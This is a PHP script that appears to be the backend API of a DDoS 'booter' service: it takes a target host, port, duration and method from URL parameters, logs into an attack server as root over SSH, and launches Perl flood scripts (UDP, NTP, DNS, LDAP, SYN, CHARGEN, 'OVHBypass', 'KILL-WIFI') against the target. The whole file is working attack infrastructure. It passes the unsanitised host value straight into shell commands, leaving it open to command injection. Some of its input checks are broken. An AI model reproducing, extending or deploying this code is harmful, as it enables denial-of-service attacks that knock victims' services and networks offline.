<?php
/////////////////////////////////
//--     Venux API Script - Modified by Aggron    --//
/////////////////////////////////
ignore_user_abort(true);
set_time_limit(0);
//////////////////////////////////////////
//--    You're servers credentials    --//
//-- Enter you're servers credentials --//
//////////////////////////////////////////
$server_ip = ""; //Change "1337" to your servers IP.
$server_pass = ""; //Change "pass" to your servers password.
$server_user = "root"; //Only change this if your using a user other than root.
 
/////////////////////////////////////////
//-- Gets the value of each variable --//
/////////////////////////////////////////
$key = $_GET['key'];
$host = $_GET['host'];
$port = intval($_GET['port']);
$time = intval($_GET['time']);
$size = intval($_GET['size']);
$method = $_GET['method'];
$action = $_GET['action'];
 
///////////////////////////////////////////////////
//-- array of implemented method as a variable --//
///////////////////////////////////////////////////
$array = array("VPN-Null", "VPN-TCP", "VPN-Killer", "UDP", "NTP", "DNS", "LDAP", "FLOOD", "SSYN", "TCP", "SYN", "SUDP", "SMASH", "VOX", "RIP", "PLAIN", "CHARGEN", "ACK", "UDP-NULL", "SUPER", "GAME", "STORM", "UDP2", "NTP2", "DNS-2", "SNMP", "HTTP", "BYPASS", "HOTSPOT", "KILL-WIFI", "NFOBypass-Weak", "OVHBypass-Weak",  "STOP");
// Add you're existing methods here, and delete you're none existent methods.

$ray = array("key12345");
 
////////////////////////////////////////
//-- Checks if the API key is empty --//
////////////////////////////////////////
if (!empty($key)){
}else{
die('Error: API key is empty!');}
 
//////////////////////////////////////////
//-- Checks if the API key is correct --//
//////////////////////////////////////////
if (in_array($key, $ray)){ //Change "key" to what ever yo want you're API key to be.
}else{
die('Error: Incorrect API key!');}
 
/////////////////////////////////
//-- Checks if time is empty --//
/////////////////////////////////
if (!empty($time)){
}else{
die('Error: time is empty!');}
 
/////////////////////////////////
//-- Checks if host is empty --//
/////////////////////////////////
if (!empty($host)){
}else{
die('Error: Host is empty!');}
///////////////////////////////////
//-- Checks if method is empty --//
///////////////////////////////////
if (!empty($method)){
}else{
die('Error: Method is empty!');}
 
///////////////////////////////////
//-- Checks if method is empty --//
///////////////////////////////////
if (in_array($method, $array)){
}else{
die('Error: The method you requested does not exist!');}
///////////////////////////////////////////////////
//-- Uses regex to see if the Port could exist --//
///////////////////////////////////////////////////
if ($port > 44405){
die('Error: Ports over 44405 do not exist');}
 
//////////////////////////////////
//-- Sets a Maximum boot time --//
//////////////////////////////////             
if ($time > 36000){
die('Error: Cannot exceed 36000 seconds!');} //Change 10 to the time you used above.
 
if(ctype_digit($Time)){
die('Error: Time is not in numeric form!');}
 
if(ctype_digit($Port)){
die('Error: Port is not in numeric form!');}

///////////////////////////////////////////////////
//-- Uses regex to see if the size could exist --//
///////////////////////////////////////////////////
if ($size > 6000){
die('Error: size over 6000 do not exist');}
 
//////////////////////////////////////////////////////////////////////////////
//--                        You're attack methods                         --//
//-- Make sure the command is formatted correctly for each method you add --//
//////////////////////////////////////////////////////////////////////////////
if ($method == "VPN-Null") { $command = "screen -dm perl /root/VPN-Null.pl $host $port $size $time"; }
if ($method == "VPN-Killer") { $command = "screen -dm perl /root/VPN-Killer.pl $host $port $size $time"; }
if ($method == "VPN-TCP") { $command = "screen -dm perl /root/VPN-TCP.pl $host $port $size $time"; }
if ($method == "UDP") { $command = "screen -dm perl /root/UDP.pl $host $port $size $time"; }
if ($method == "NTP") { $command = "screen -dm perl /root/NTP.pl $host $port $size $time"; }
if ($method == "LDAP") { $command = "screen -dm perl /root/LDAP.pl $host $port $size $time"; }
if ($method == "DNS") { $command = "screen -dm perl /root/DNS.pl $host $port $size $time"; }
if ($method == "FLOOD") { $command = "screen -dm perl /root/FLOOD.pl $host $port $size $time"; }
if ($method == "SSYN") { $command = "screen -dm perl /root/SSYN.pl $host $port $size $time"; }
if ($method == "TCP") { $command = "screen -dm perl /root/TCP.pl $host $port $size $time"; }
if ($method == "SYN") { $command = "screen -dm perl /root/SYN.pl $host $port $size $time"; }
if ($method == "SUDP") { $command = "screen -dm perl /root/SUDP.pl $host $port $size $time"; }
if ($method == "SMASH") { $command = "screen -dm perl /root/SMASH.pl $host $port $size $time"; }
if ($method == "VOX") { $command = "screen -dm perl /root/VOX.pl $host $port $size $time"; }
if ($method == "RIP") { $command = "screen -dm perl /root/RIP.pl $host $port $size $time"; }
if ($method == "PLAIN") { $command = "screen -dm perl /root/PLAIN.pl $host $port $size $time"; }
if ($method == "ACK") { $command = "screen -dm perl /root/ACK.pl $host $port $size $time"; }
if ($method == "CHARGEN") { $command = "screen -dm perl /root/CHARGEN.pl $host $port $size $time"; }
if ($method == "UDP-NULL") { $command = "screen -dm perl /root/UDP-NULL.pl $host $port $size $time"; }
if ($method == "SUPER") { $command = "screen -dm perl /root/SUPER.pl $host $port $size $time"; }
if ($method == "GAME") { $command = "screen -dm perl /root/GAME.pl $host $port $size $time"; }
if ($method == "STORM") { $command = "screen -dm perl /root/STORM.pl $host $port $size $time"; }
if ($method == "UDP2") { $command = "screen -dm perl /root/UDP2.pl $host $port $size $time"; }
if ($method == "NTP2") { $command = "screen -dm perl /root/NTP2.pl $host $port $size $time"; }
if ($method == "DNS-2") { $command = "screen -dm perl /root/DNS-2.pl $host $port $size $time"; }
if ($method == "SNMP") { $command = "screen -dm perl /root/SNMP.pl $host $port $size $time"; }
if ($method == "HTTP") { $command = "screen -dm perl HTTP.pl $host $time"; }
if ($method == "BYPASS") { $command = "screen -dm perl /root/BYPASS.pl $host $time"; }
if ($method == "HOTSPOT") { $command = "screen -dm perl /root/HOTSPOT.pl $host $port $size $time"; }
if ($method == "KILL-WIFI") { $command = "screen -dm perl /root/KILL-WIFI.pl $host $port $size $time"; }
if ($method == "NFOBypass-Weak") { $command = "screen -dm perl /root/NFOBypass-Weak.pl $host $port $size $time"; }
if ($method == "OVHBypass-Weak") { $command = "screen -dm perl /root/OVHBypass-Weak.pl $host $port $size $time"; }
if ($method == "STOP") { $command = "pkill $host -f"; }
///////////////////////////////////////////////////////
//-- Check to see if the server has SSH2 installed --//
///////////////////////////////////////////////////////
if (!function_exists("ssh2_connect")) die("Error: SSH2 does not exist on you're server");
if(!($con = ssh2_connect($server_ip, 22))){
  echo "Error: Connection Issue";
} else {
 
///////////////////////////////////////////////////
//-- Attempts to login with you're credentials --//
///////////////////////////////////////////////////
    if(!ssh2_auth_password($con, $server_user, $server_pass)) {
        echo "Error: Login failed, one or more of you're server credentials are incorect.";
    } else {
       
////////////////////////////////////////////////////////////////////////////
//-- Tries to execute the attack with the requested method and settings --//
////////////////////////////////////////////////////////////////////////////   
        if (!($stream = ssh2_exec($con, $command ))) {
            echo "Error: You're server was not able to execute you're methods file and or its dependencies";
        } else {
////////////////////////////////////////////////////////////////////
//-- Executed the attack with the requested method and settings --//
////////////////////////////////////////////////////////////////////      
            stream_set_blocking($stream, false);
            $data = "";
            while ($buf = fread($stream,4096)) {
                $data .= $buf;
            }
                        echo "Attack started!!</br>Hitting: $host</br>On Port: $port </br>Attack Length: $time</br>With: $method</br>Attack Length: $size";
            fclose($stream);
        }
    }
}
?>